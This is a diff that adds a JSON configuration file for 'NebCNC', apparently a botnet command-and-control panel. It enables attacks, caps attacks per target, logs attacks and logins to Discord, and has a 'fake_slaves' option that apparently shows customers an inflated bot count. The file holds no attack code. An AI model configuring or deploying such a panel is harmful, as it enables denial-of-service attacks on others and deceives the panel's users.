@@ -1,0 +1,45 @@
+{
+  "nebulacnc": {
+    "remove-this-comment": "put ur license key below to gain access to screen the main compiled file.",
+    "license": "This Key is no worky:("
+  },
+  "cnc": {
+    "name": "NebCNC",
+    "slots": 80,
+    "port": 1337,
+    "funnelPort": 8080
+  },
+  "settings": {
+    "attacksEnabled": true,
+    "generateHelp": false,
+    "generateMethods": false,
+    "tosFunction": true,
+    "globalCooldown": 15,
+    "defaultColor": "#ffffff",
+    "maxAttacksInOneTarget": 3,
+    "spamCooldown": "1 MINUTE",
+    "customLogin": true
+  },
+  "discord_logs": {
+    "attacks": "",
+    "logins": ""
+  },
+  "size": {
+    "columns": 80,
+    "rows": 24
+  },
+  "mysql": {
+    "host": "localhost",
+    "user": "root",
+    "password": "",
+    "db": ""
+  },
+  "fake_slaves": {
+    "enabled": true,
+    "maximum": 29058,
+    "minimum": 10018,
+    "sleep": 10000,
+    "max_change": 18,
+    "min_change": 2
+  }
+}
